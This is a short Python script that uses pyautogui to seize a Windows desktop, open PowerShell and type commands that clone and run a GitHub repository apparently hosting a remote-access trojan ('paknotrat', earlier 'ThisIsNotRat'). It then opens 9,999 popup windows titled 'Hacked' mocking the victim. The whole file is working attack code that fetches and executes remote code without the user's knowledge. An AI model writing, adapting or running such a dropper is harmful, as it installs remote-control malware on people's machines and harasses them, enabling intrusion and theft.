# import pyautogui
# import time

# # Wait for a few seconds to give you time to focus on the Run dialog
# time.sleep(5)

# # Open the Run dialog using the keyboard shortcut (Win + R)
# pyautogui.hotkey('win', 'r')

# # the Run dialog is open
# time.sleep(1)



# # Type 'cmd' and press Enter
# pyautogui.write('powershell', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')
# # pyautogui.hotkey('ctrl', 'shift', 'enter')
# # pyautogui.press('left')
# # pyautogui.press('enter')

# # install auto gui
# pyautogui.write('pip install pyautogui', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')
# #git clone link also can b taken from user if needed

# pyautogui.write('git clone https://github.com/theriturajps/ThisIsNotRat.git', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')

# #further actions

# pyautogui.write('cd ThisIsNotRat', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')

# #requirements of tool
# pyautogui.write('pip install -r requirements.txt', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')

# # execution
# pyautogui.write('python ThisIsNotRat.py', interval=0.1)  # You can adjust the interval to make it faster or slower
# pyautogui.press('enter')


# ___________________________________________________________________________________________



import pyautogui
import time

# Wait for a few seconds to give you time to focus on the Run dialog
time.sleep(2)

# Open the Run dialog using the keyboard shortcut (Win + R)
pyautogui.hotkey('win', 'r')

# the Run dialog is open
time.sleep(1)


# Type 'cmd' and press Enter
pyautogui.write('powershell', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')
# pyautogui.hotkey('ctrl', 'shift', 'enter')
# pyautogui.press('left')
# pyautogui.press('enter')

# install auto gui
pyautogui.write('pip install pyautogui', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')
#git clone link also can b taken from user if needed

pyautogui.write('git clone https://github.com/oliver7896/paknotrat.git', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')

pyautogui.write('git clone https://github.com/oliver7896/paknotrat.git', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')

#further actions

pyautogui.write('cd paknotrat', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')

#requirements of tool
pyautogui.write('pip install -r requirements.txt', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')

# execution
pyautogui.write('python paknotrat.py', interval=0.1)  # You can adjust the interval to make it faster or slower
pyautogui.press('enter')

import tkinter as tk
from tkinter import messagebox

def show_custom_error_message():
    custom_dialog = tk.Toplevel()
    custom_dialog.title("Hacked")
    
    # Create a Label widget with custom width
    label = tk.Label(custom_dialog, text="You have been Fooled! \n\U0001F921", width=40)
    label.pack()

# Create the main window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Create a list to store error messages
error_messages = [show_custom_error_message] * 9999

# Show all custom error messages
for custom_error_message in error_messages:
    custom_error_message()

root.mainloop()